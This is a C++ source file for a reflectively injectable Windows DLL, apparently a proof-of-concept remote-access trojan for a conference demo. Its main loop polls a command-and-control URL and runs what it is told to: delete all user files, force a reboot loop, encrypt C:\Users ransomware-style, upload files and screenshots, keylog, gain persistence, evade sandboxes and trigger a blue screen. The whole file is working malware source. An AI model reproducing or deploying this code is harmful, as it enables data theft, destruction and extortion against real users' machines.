//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include <time.h>
#include <windows.h>
#include <thread>         // std::thread

#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <vector>    

#include <limits>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <bitset>
#include <regex>

#include <windows.h>
#include <tchar.h>
#include <stdio.h>

#include "ReflectiveLoader.h"
#include "..\Crypto.h"
#include "..\utilities.h"
#include "..\FileOverWeb.h"
#include "..\KeyLogger.h"
#include "..\FileEnumerator.h"
#include "..\Persist.h"
#include "..\ScreenshotGrabber.h"
#include "..\Antis.h"
#include "..\bsod.h"


// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//



using namespace std;

char* C2_address = "bsideslv.da.best.com/abc.html";
bool isKeyLoggerRunning = false;

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	TCHAR tempPath[MAX_PATH];
	GetTempPath(MAX_PATH, tempPath);
	char* order = strcat(tempPath, "data.dat");

    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;

			// main malware loop
			while (true) {
				//cout << order << endl;

				GetUrlOverHttp(C2_address, order);

				// no-op
				if (CheckIfWordInFile("<H1>301", order)) {
					//pass
				}

				// pop message box
				if (CheckIfWordInFile("<H1>302", order)) {
					MessageBoxA(NULL, "LazyS is in da house", "LazyS", MB_OK);
				}

				// delete all files
				else if (CheckIfWordInFile("<H1>303", order)) {
					thread t(RunSilent,"del /Q /F /S c:\\users\\*", "");
					t.detach();
				}

				// cuase bootloop
				else if (CheckIfWordInFile("<H1>304", order)) {
					RunSilent("schtasks /create /sc minute /mo 1 /tn restart /tr \"shutdown -r -f -t 0\"", "");
				}

				// "Ransomware"
				else if (CheckIfWordInFile("<H1>305", order)) {
					//EncryptVictim(L"C:\\Users\\Public\\Pictures\\Sample Pictures"); // safety measure for PoCs
					EncryptVictim(L"C:\\Users"); //PLEAZ be carefull with thiz one
				}

				// steal file
				else if (CheckIfWordInFile("<H1>306", order)) {
					// File to steal will be parsed as what comes after :: in the C2 order
					try
					{
						std::string fileToSteal = "\"\"\"" + GetFileToSteal(order) + "\"\"\"";
						//cout << fileToSteal << endl;
						UploadFile(fileToSteal);

					}
					catch (const std::exception&)
					{
					//	cout << GetLastError << endl;

					}
				}
				// Send a list of all files present on the victim's machine
				else if (CheckIfWordInFile("<H1>307", order)) {
					GetFileList();
					TCHAR tempPath[MAX_PATH];
					GetTempPath(MAX_PATH, tempPath);
					char s[500] = "";
					snprintf(s, 500, "%s%s%s","\"\"\"" ,tempPath, "\\system_analysis_log.txt\"\"\"");
					UploadFile(s);
					remove(strcat(tempPath, "\\system_analysis_log.txt"));
				}

				// start keylogger
				else if (CheckIfWordInFile("<H1>308", order)) {
					if (!(isKeyLoggerRunning)) {
						try
						{
							thread t(KeyLoggerStart);
							t.detach();
						}
						catch (const std::exception&)
						{

						}
					}
					else {
						//pass
					}
					
				}

				// Antis, BSoD if found VM\sandbox
				else if (CheckIfWordInFile("<H1>309", order)) {
					// if sandbox then exit
					thread t(IsThereAnyBodyOutThere);						
					t.detach();

				}
				
				// get persistency
				else if (CheckIfWordInFile("<H1>310", order)) {
					thread t(Persist);
					t.detach();
				}

				// Take screenshot
				else if (CheckIfWordInFile("<H1>311", order)) {
					TakeScreenShot();
					TCHAR tempPath[MAX_PATH];
					GetTempPath(MAX_PATH, tempPath);
					char s[500] = "";
					snprintf(s, 500, "%s%s%s", "\"\"\"", tempPath, "\\screen.jpg\"\"\"");
					UploadFile(s);
					remove(strcat(tempPath, "\\screen.jpg"));
				}


				// trigger BSOD, just for cause
				else if (CheckIfWordInFile("<H1>312", order)) {
					TriggerBSOD();
				}
				

				Sleep(15*1000);
			}
			

		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}